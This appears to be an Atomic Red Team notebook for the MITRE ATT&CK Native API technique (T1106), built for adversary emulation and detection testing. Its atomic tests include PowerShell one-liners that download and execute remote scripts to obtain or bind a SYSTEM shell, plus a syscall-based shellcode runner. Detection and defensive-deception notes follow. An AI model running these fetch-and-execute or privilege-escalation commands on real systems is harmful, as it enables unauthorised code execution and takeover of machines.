{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "a574fbfc",
   "metadata": {},
   "source": "# T1106 - Native API\nAdversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)."
  },
  {
   "cell_type": "markdown",
   "id": "254eb6ce",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "12761548",
   "metadata": {},
   "source": "### Atomic Test #1 - Execution through API - CreateProcess\nExecute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: #{source_file} must exist on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs\" -OutFile \"PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7baefcd6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1106 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fe23036f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"%tmp%\\T1106.exe\" /target:exe \"PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs\"\n%tmp%/T1106.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "457f335a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1106 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "8d2ebdf5",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique",
    "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2c9bb135",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1106 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "60b6fcbd",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique",
    "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca7561c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1106 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "a97e5978",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique",
    "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "13c02cc9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1106 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "b42c41eb",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Run Shellcode via Syscall in Go",
    "Runs shellcode in the current running process via a syscall.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Use syscall to execute the entrypoint of the shellcode\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PathToAtomicsFolder\\T1106\\bin\\x64\\syscall.exe -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c5cab2b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1106 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "f2c17083",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1b7b7bf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1106 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "400ea47f",
   "metadata": {},
   "source": "## Detection\nMonitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. "
  },
  {
   "cell_type": "markdown",
   "id": "9f608f88",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Software Manipulation \n Make changes to a system's software properties and functions to achieve a desired effect. \n\n Software Manipulation allows a defender to alter or replace elements of the operating system, file system, or any other software installed and executed on a system.\n#### Opportunity\nThere is an opportunity for the defender to observe the adversary and control what they can see, what effects they can have, and/or what data they can access.\n#### Use Case\nA defender can modify system calls to break communications, route things to decoy systems, prevent full execution, etc.\n#### Procedures\nHook the Win32 Sleep() function so that it always performs a Sleep(1) instead of the intended duration. This can increase the speed at which dynamic analysis can be performed when a normal malicious file sleeps for long periods before attempting additional capabilities.\nHook the Win32 NetUserChangePassword() and modify it such that the new password is different from the one provided. The data passed into the function is encrypted along with the modified new password, then logged so a defender can get alerted about the change as well as decrypt the new password for use.\nAlter the output of an adversary's profiling commands to make newly-built systems look like the operating system was installed months earlier.\nAlter the output of adversary recon commands to not show important assets, such as a file server containing sensitive data.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}